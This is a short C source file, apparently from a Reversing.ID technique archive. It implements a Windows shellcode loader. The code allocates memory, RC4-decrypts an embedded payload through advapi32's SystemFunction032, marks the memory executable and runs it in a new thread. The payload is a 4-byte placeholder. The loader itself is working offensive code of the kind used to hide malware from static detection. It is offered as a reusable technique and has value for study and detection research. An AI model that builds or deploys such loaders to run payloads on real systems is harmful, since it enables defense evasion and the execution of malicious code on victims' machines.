/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RC4 with SystemFunction032 or SystemFunction033
    - permission: VirtualProtect
    - execution:  CreateThread

Note:
    - shellcode will be allocated at runtime in USTRING struct
    - either SystemFunction032 or SystemFunction033 give the same result
*/

#include <windows.h>
#include <stdint.h>
#include <stdlib.h>

/* ========= some definition ========= */
typedef struct
{
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} ustring;

/* ========= function signatures ========= */
typedef NTSTATUS NTAPI SystemFunction032_t (ustring* data, ustring* key);
typedef SystemFunction032_t FAR * pSystemFunction032;


int main ()
{
    void *   runtime;
    BOOL     retval;
    HANDLE   th_shellcode;
    DWORD    old_protect = 0;

    // shellcode storage in stack
    uint8_t  payload_buf[] = { 0x91, 0xa0, 0x70, 0xe6 };
    size_t   payload_len = 4;
    uint8_t  key_buf[] = "Reversing.ID_ShellcodeLoader1337";
    size_t   key_len = 32;

    HMODULE  lib;

    ustring  payload;
    ustring  key;

    // function pointer to internal API
    pSystemFunction032 SystemFunction032;

    // resolve
    lib = LoadLibrary("advapi32.dll");
    SystemFunction032 = (pSystemFunction032) GetProcAddress(lib, "SystemFunction032");

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // copy payload to the buffer
    RtlMoveMemory (runtime, payload_buf, payload_len);

    // decrypt the payload
    payload.Length = payload_len;
    payload.Buffer = runtime;

    key.Length = key_len;
    key.Buffer = key_buf;

    SystemFunction032 (&payload, &key);

    // make buffer executable (R-X)
    retval = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    return 0;
}